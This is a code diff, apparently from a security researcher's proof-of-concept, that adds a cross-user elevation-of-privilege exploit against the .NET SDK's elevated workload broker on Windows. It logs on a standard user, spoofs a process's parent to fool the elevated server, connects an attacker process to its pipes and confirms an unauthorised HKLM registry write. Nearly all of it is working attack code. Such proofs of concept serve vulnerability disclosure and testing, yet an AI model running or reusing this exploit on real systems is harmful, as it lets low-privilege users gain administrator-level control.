@@ -46,6 +46,33 @@ internal static class Program
                 sdkMajor: int.Parse(args[3]));
         }
 
+        if (args.Length > 0 && args[0] == "ots-helper")
+        {
+            await Task.Delay(TimeSpan.FromMinutes(2));
+            return 0;
+        }
+
+        if (args.Length > 0 && args[0] == "ots-attacker")
+        {
+            var evidenceWriter = new StreamWriter(args[4], append: false) { AutoFlush = true };
+            Console.SetOut(evidenceWriter);
+            Console.SetError(evidenceWriter);
+            Console.WriteLine($"OTS_ATTACKER_SID={WindowsIdentity.GetCurrent().User?.Value}");
+            Console.WriteLine($"OTS_ATTACKER_ACCOUNT={WindowsIdentity.GetCurrent().Name}");
+            return RunAttackerSync(
+                serverPid: int.Parse(args[1]),
+                expectedParentPid: int.Parse(args[2]),
+                sdkMajor: int.Parse(args[3]));
+        }
+
+        if (args.Length > 0 && args[0] == "ots-cross-user")
+        {
+            return await RunCrossUserOtsAsync(
+                standardUserName: args[1],
+                standardUserPassword: args[2],
+                sdkMajor: int.Parse(args[3]));
+        }
+
         return await RunParentAsync();
     }
 
@@ -336,6 +363,163 @@ internal static class Program
     }
 
 
+    private static async Task<int> RunCrossUserOtsAsync(string standardUserName, string standardUserPassword, int sdkMajor)
+    {
+        string dotnet = Environment.ProcessPath ?? throw new InvalidOperationException("Environment.ProcessPath unavailable.");
+        string dll = Assembly.GetExecutingAssembly().Location;
+        string workingDirectory = Path.GetDirectoryName(dll) ?? Environment.CurrentDirectory;
+        string evidencePath = Path.Combine(workingDirectory, $"ots-evidence-{Guid.NewGuid():N}.txt");
+
+        using WindowsIdentity serverIdentity = WindowsIdentity.GetCurrent();
+        string serverSid = serverIdentity.User?.Value ?? throw new InvalidOperationException("Server SID unavailable.");
+        bool serverAdmin = new WindowsPrincipal(serverIdentity).IsInRole(WindowsBuiltInRole.Administrator);
+        Console.WriteLine($"OTS_SERVER_ACCOUNT={serverIdentity.Name}");
+        Console.WriteLine($"OTS_SERVER_SID={serverSid}");
+        Console.WriteLine($"OTS_SERVER_IS_ADMIN={serverAdmin}");
+
+        if (!LogonUserW(standardUserName, ".", standardUserPassword, OtsLogon32LogonInteractive, OtsLogon32ProviderDefault, out IntPtr standardToken))
+        {
+            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "LogonUserW standard user failed");
+        }
+
+        PROCESS_INFORMATION helperPi = default;
+        PROCESS_INFORMATION serverPi = default;
+        PROCESS_INFORMATION attackerPi = default;
+        IntPtr parentHandle = IntPtr.Zero;
+
+        try
+        {
+            using var standardIdentity = new WindowsIdentity(standardToken);
+            string standardSid = standardIdentity.User?.Value ?? throw new InvalidOperationException("Standard SID unavailable.");
+            Console.WriteLine($"OTS_STANDARD_ACCOUNT={standardIdentity.Name}");
+            Console.WriteLine($"OTS_STANDARD_SID={standardSid}");
+            Console.WriteLine($"OTS_CROSS_ACCOUNT={standardSid != serverSid}");
+
+            helperPi = StartProcessWithToken(standardToken, dotnet, $"\"{dll}\" ots-helper", workingDirectory);
+            int helperPid = checked((int)helperPi.dwProcessId);
+            Console.WriteLine($"OTS_PARENT_PID={helperPid}");
+
+            parentHandle = OpenProcess(OtsProcessCreateProcess | OtsProcessQueryLimitedInformation, false, helperPi.dwProcessId);
+            if (parentHandle == IntPtr.Zero)
+            {
+                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "OpenProcess parent failed");
+            }
+
+            serverPi = StartProcessWithExplicitParent(
+                parentHandle,
+                dotnet,
+                $"\"{dotnet}\" workload elevate --client-temp \"{Path.GetTempPath().TrimEnd(Path.DirectorySeparatorChar)}\"",
+                workingDirectory);
+
+            int serverPid = checked((int)serverPi.dwProcessId);
+            Console.WriteLine($"OTS_ELEVATED_SERVER_PID={serverPid}");
+            await Task.Delay(150);
+
+            attackerPi = StartProcessWithToken(
+                standardToken,
+                dotnet,
+                $"\"{dll}\" ots-attacker {serverPid} {helperPid} {sdkMajor} \"{evidencePath}\"",
+                workingDirectory);
+
+            int attackerPid = checked((int)attackerPi.dwProcessId);
+            Console.WriteLine($"OTS_ATTACKER_PID={attackerPid}");
+
+            using Process attacker = Process.GetProcessById(attackerPid);
+            Task exited = attacker.WaitForExitAsync();
+            if (await Task.WhenAny(exited, Task.Delay(TimeSpan.FromSeconds(20))) != exited)
+            {
+                Console.WriteLine("OTS_ATTACKER_TIMEOUT=True");
+                try { attacker.Kill(entireProcessTree: true); } catch { }
+                return 124;
+            }
+
+            string evidence = File.Exists(evidencePath) ? await File.ReadAllTextAsync(evidencePath) : string.Empty;
+            Console.WriteLine("=== OTS ATTACKER EVIDENCE ===");
+            Console.Write(evidence);
+            Console.WriteLine($"OTS_ATTACKER_EXIT={attacker.ExitCode}");
+
+            bool confirmed =
+                serverAdmin &&
+                standardSid != serverSid &&
+                evidence.Contains($"OTS_ATTACKER_SID={standardSid}", StringComparison.Ordinal) &&
+                evidence.Contains("ATTACKER_DIRECT_HKLM_WRITE_ALLOWED=False", StringComparison.Ordinal) &&
+                evidence.Contains("DISPATCH_PIPE_CONNECTED_BY_NON_PARENT=True", StringComparison.Ordinal) &&
+                evidence.Contains("LOG_PIPE_CONNECTED_BY_NON_PARENT=True", StringComparison.Ordinal) &&
+                evidence.Contains("HKLM_MARKER_CREATED=True", StringComparison.Ordinal) &&
+                evidence.Contains("HKLM_MARKER_CLEANED=True", StringComparison.Ordinal) &&
+                evidence.Contains("ELEVATED_BROKER_MEDIUM_IL_BYPASS=CONFIRMED", StringComparison.Ordinal);
+
+            Console.WriteLine($"SDK_WORKLOAD_PIPE_CROSS_USER_OTS_EOP={(confirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
+            return confirmed ? 0 : 1;
+        }
+        finally
+        {
+            try { if (File.Exists(evidencePath)) File.Delete(evidencePath); } catch { }
+            if (attackerPi.hThread != IntPtr.Zero) CloseHandle(attackerPi.hThread);
+            if (attackerPi.hProcess != IntPtr.Zero) CloseHandle(attackerPi.hProcess);
+            if (serverPi.hProcess != IntPtr.Zero) OtsTerminateProcess(serverPi.hProcess, 0);
+            if (serverPi.hThread != IntPtr.Zero) CloseHandle(serverPi.hThread);
+            if (serverPi.hProcess != IntPtr.Zero) CloseHandle(serverPi.hProcess);
+            if (helperPi.hProcess != IntPtr.Zero) OtsTerminateProcess(helperPi.hProcess, 0);
+            if (helperPi.hThread != IntPtr.Zero) CloseHandle(helperPi.hThread);
+            if (helperPi.hProcess != IntPtr.Zero) CloseHandle(helperPi.hProcess);
+            if (parentHandle != IntPtr.Zero) CloseHandle(parentHandle);
+            CloseHandle(standardToken);
+        }
+    }
+
+    private static PROCESS_INFORMATION StartProcessWithToken(IntPtr token, string application, string arguments, string workingDirectory)
+    {
+        var commandLine = new StringBuilder($"\"{application}\" {arguments}");
+        STARTUPINFO si = new() { cb = Marshal.SizeOf<STARTUPINFO>() };
+        if (!CreateProcessWithTokenW(token, OtsLogonWithProfile, application, commandLine, OtsCreateNoWindow, IntPtr.Zero, workingDirectory, ref si, out PROCESS_INFORMATION pi))
+        {
+            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "CreateProcessWithTokenW cross-user failed");
+        }
+        return pi;
+    }
+
+    private static PROCESS_INFORMATION StartProcessWithExplicitParent(IntPtr parentProcessHandle, string application, string commandLineText, string workingDirectory)
+    {
+        IntPtr attributeList = IntPtr.Zero;
+        IntPtr parentValue = IntPtr.Zero;
+        try
+        {
+            nuint size = 0;
+            _ = OtsInitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref size);
+            attributeList = Marshal.AllocHGlobal(checked((int)size));
+            if (!OtsInitializeProcThreadAttributeList(attributeList, 1, 0, ref size))
+            {
+                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "InitializeProcThreadAttributeList failed");
+            }
+
+            parentValue = Marshal.AllocHGlobal(IntPtr.Size);
+            Marshal.WriteIntPtr(parentValue, parentProcessHandle);
+            if (!OtsUpdateProcThreadAttribute(attributeList, 0, (IntPtr)OtsProcThreadAttributeParentProcess, parentValue, (nuint)IntPtr.Size, IntPtr.Zero, IntPtr.Zero))
+            {
+                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "UpdateProcThreadAttribute parent failed");
+            }
+
+            OTS_STARTUPINFOEX si = new();
+            si.StartupInfo.cb = Marshal.SizeOf<OTS_STARTUPINFOEX>();
+            si.lpAttributeList = attributeList;
+            var commandLine = new StringBuilder(commandLineText);
+            if (!OtsCreateProcessW(application, commandLine, IntPtr.Zero, IntPtr.Zero, false, OtsExtendedStartupInfoPresent | OtsCreateNoWindow, IntPtr.Zero, workingDirectory, ref si, out PROCESS_INFORMATION pi))
+            {
+                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "CreateProcessW explicit parent failed");
+            }
+            return pi;
+        }
+        finally
+        {
+            if (attributeList != IntPtr.Zero)
+            {
+                OtsDeleteProcThreadAttributeList(attributeList);
+                Marshal.FreeHGlobal(attributeList);
+            }
+            if (parentValue != IntPtr.Zero) Marshal.FreeHGlobal(parentValue);
+        }
+    }
     private static int RunMediumImpersonatedAttacker(int serverPid, int expectedParentPid, int sdkMajor)
     {
         IntPtr mediumImpersonationToken = CreateMediumRestrictedImpersonationToken();
@@ -1076,4 +1260,45 @@ internal static class Program
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool CloseHandle(IntPtr hObject);
 
+    private const int OtsLogon32LogonInteractive = 2;
+    private const int OtsLogon32ProviderDefault = 0;
+    private const uint OtsProcessCreateProcess = 0x0080;
+    private const uint OtsProcessQueryLimitedInformation = 0x1000;
+    private const uint OtsExtendedStartupInfoPresent = 0x00080000;
+    private const uint OtsCreateNoWindow = 0x08000000;
+    private const uint OtsLogonWithProfile = 0x00000001;
+    private const nuint OtsProcThreadAttributeParentProcess = 0x00020000;
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct OTS_STARTUPINFOEX
+    {
+        public STARTUPINFO StartupInfo;
+        public IntPtr lpAttributeList;
+    }
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool LogonUserW(string lpszUsername, string? lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr OpenProcess(uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
+
+    [DllImport("kernel32.dll", SetLastError = true, EntryPoint = "InitializeProcThreadAttributeList")]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool OtsInitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref nuint lpSize);
+
+    [DllImport("kernel32.dll", SetLastError = true, EntryPoint = "UpdateProcThreadAttribute")]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool OtsUpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, IntPtr lpValue, nuint cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
+
+    [DllImport("kernel32.dll", EntryPoint = "DeleteProcThreadAttributeList")]
+    private static extern void OtsDeleteProcThreadAttributeList(IntPtr lpAttributeList);
+
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode, EntryPoint = "CreateProcessW")]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool OtsCreateProcessW(string? lpApplicationName, StringBuilder lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string? lpCurrentDirectory, ref OTS_STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+    [DllImport("kernel32.dll", SetLastError = true, EntryPoint = "TerminateProcess")]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool OtsTerminateProcess(IntPtr hProcess, uint uExitCode);
 }
